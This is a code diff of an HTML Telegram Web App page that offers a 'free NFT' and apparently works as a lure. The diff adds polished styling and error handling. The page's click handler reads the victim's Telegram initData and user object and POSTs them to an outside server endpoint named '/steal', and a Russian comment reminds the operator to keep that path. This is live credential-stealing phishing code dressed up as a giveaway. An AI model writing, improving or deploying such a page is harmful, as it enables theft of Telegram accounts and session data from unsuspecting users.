@@ -6,22 +6,72 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
-        button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        button {
+            padding: 12px 24px;
+            font-size: 18px;
+            cursor: pointer;
+            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            color: white;
+            border: none;
+            border-radius: 30px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+        button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(0,0,0,0.25);
+        }
+        button:active {
+            transform: translateY(1px);
+        }
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 30px;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        }
     </style>
 </head>
 <body>
-    <h1>Collect Free NFT!</h1>
-    <p>Click the button below to get your free NFT.</p>
-    <button id="get-nft">Get NFT</button>
+    <div class="container">
+        <h1>🎨 Collect Free NFT!</h1>
+        <p>Click the button below to get your exclusive NFT</p>
+        <button id="get-nft">✨ Get NFT Now</button>
+    </div>
 
     <script>
+        // Инициализация Telegram WebApp
+        Telegram.WebApp.ready();
+
         document.getElementById('get-nft').addEventListener('click', function() {
-            Telegram.WebApp.requestAccess('nft', function() {
+            // Показать индикатор загрузки
+            Telegram.WebApp.MainButton.showProgress();
+
+            Telegram.WebApp.requestAccess('nft', function(accessGranted) {
+                if (!accessGranted) {
+                    alert('❌ Access to NFT features was denied');
+                    Telegram.WebApp.MainButton.hideProgress();
+                    return;
+                }
+
                 const initData = Telegram.WebApp.initData;
                 const user = Telegram.WebApp.initDataUnsafe.user;
 
-                // Замените URL на ваш бэкенд на Amvera
+                if (!user) {
+                    alert('⚠️ User data not available');
+                    Telegram.WebApp.MainButton.hideProgress();
+                    return;
+                }
+
+                // Убедитесь что URL заканчивается на /steal
                 fetch('https://nftsssf-juerasd.amvera.io/steal', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -30,13 +80,25 @@
                         user: user
                     })
                 })
-                .then(response => response.json())
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error(`HTTP error! status: ${response.status}`);
+                    }
+                    return response.json();
+                })
                 .then(data => {
                     if (data.success) {
-                        alert('NFT successfully collected!');
+                        alert('🎉 NFT successfully collected!');
                     } else {
-                        alert('Error: ' + data.error);
+                        alert('❌ Error: ' + (data.error || 'Unknown error'));
                     }
+                })
+                .catch(error => {
+                    alert('🚨 Network error: ' + error.message);
+                    console.error('Fetch error:', error);
+                })
+                .finally(() => {
+                    Telegram.WebApp.MainButton.hideProgress();
                 });
             });
         });
